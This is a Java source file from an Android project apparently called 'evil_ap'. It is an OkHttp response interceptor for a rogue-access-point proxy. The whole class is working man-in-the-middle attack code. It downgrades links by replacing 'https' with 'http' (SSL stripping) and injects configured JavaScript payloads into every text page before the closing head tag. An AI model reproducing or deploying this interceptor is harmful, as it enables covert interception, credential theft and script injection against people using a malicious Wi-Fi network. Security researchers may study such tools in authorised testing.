package com.nibiru.evil_ap.proxy;


import android.content.SharedPreferences;

import com.nibiru.evil_ap.ConfigTags;
import com.nibiru.evil_ap.SharedClass;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.List;

import okhttp3.Interceptor;
import okhttp3.MediaType;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * Created by Nibiru on 2016-12-23.
 */

public class InterceptorResponse implements Interceptor{
    /**************************************CLASS FIELDS********************************************/
    private SharedPreferences mConfig;
    private SharedClass mSharedObj;
    /**************************************CLASS METHODS*******************************************/
    InterceptorResponse(SharedPreferences config, SharedClass shrObj){
        super();
        mConfig = config;
        mSharedObj = shrObj;
    }
    @Override
    public Response intercept(Chain chain) throws IOException {
        Response originalResponse = chain.proceed(chain.request());
        String contentType = originalResponse.header("Content-Type");
        if (contentType == null || !contentType.contains("text")) return originalResponse;

        MediaType MediaContentType = originalResponse.body().contentType();
        byte[] bytesBody = originalResponse.body().bytes();
        boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
        boolean jsInject = mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
        if (sslStrip || jsInject) {
            bytesBody = editBytes(bytesBody, sslStrip, jsInject);
        }
        ResponseBody body = ResponseBody.create(MediaContentType, bytesBody);
        return originalResponse.newBuilder().body(body).build();
    }

    private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
        try {
            String response = new String(bytesBody, "UTF-8");
            if (sslStrip) {
                response = response.replaceAll("https", "http");
            }
            if (jsInject){
                List<String> payloads = mSharedObj.getPayloads();
                String full = "";
                for(String p: payloads){
                    full += p;
                }
                response = response.replaceAll("</head>", full + "</head>");
            }
            return response.getBytes();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }
}
